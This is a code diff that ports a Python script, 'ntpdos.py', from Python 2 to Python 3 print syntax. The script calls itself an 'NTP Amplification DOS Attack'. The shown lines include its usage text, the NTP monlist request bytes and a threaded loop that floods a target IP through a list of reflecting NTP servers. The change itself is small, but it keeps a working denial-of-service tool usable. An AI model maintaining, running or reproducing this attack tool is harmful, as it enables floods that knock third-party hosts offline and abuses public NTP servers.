@@ -24,12 +24,11 @@ send(packet,loop=1) #SEND IT
 
 #So I dont have to have the same stuff twice
 def printhelp():
-    print "NTP Amplification DOS Attack"
-    print "By DaRkReD"
-    print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
-    print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
-    print "NTP serverlist file should contain one IP per line"
-    print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
+    print("NTP Amplification DOS Attack")
+    print("Usage ntpdos.py <target ip> <ntpserver list> <number of threads>")
+    print("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
+    print("NTP serverlist file should contain one IP per line")
+    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
     exit(0)
 
 if len(sys.argv) < 4:
@@ -55,8 +54,8 @@ with open(ntpserverfile) as f:
 
 #Make sure we dont out of bounds
 if numberthreads > int(len(ntplist)):
-    print "Attack Aborted: More threads than servers"
-    print "Next time dont create more threads than servers"
+    print("Attack Aborted: More threads than servers")
+    print("Next time dont create more threads than servers")
 exit(0)
 
 #Magic Packet aka NTP v2 Monlist Packet
@@ -64,8 +63,8 @@ data = "\x17\x00\x03\x2a" + "\x00" * 4
 
 #Hold our threads
 threads = []
-print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-print "Use CTRL+C to stop attack"
+print("Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
+print("Use CTRL+C to stop attack")
 
 #Thread spawner
 for n in range(numberthreads):
@@ -76,7 +75,7 @@ for n in range(numberthreads):
     threads.append(thread)
 
 #In progress!
-print "Sending..."
+print("Sending...")
 
 #Keep alive so ctrl+c still kills all them threads
 while True:
